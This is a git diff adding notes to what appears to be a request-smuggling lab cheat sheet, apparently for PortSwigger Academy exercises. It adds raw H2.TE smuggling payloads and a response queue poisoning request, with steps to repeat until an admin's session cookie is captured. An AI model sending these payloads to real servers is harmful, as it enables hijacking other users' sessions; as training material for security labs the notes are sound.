@@ -81,6 +81,30 @@ SMUGGLED
 ```
 Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
 
+## H2.TE vulnerabilities
+```
+POST / HTTP/2
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+## Response queue poisoning via H2.TE request smuggling
+```
+POST /x HTTP/2
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+
+0
+
+GET /x HTTP/1.1
+Host: vulnerable-website.com
+```
+Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.
+
 ## HTTP/2 request smuggling via CRLF injection
 1. Send the most recent POST / request to Burp Repeater and remove your session cookie before resending the request.
 2. Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.
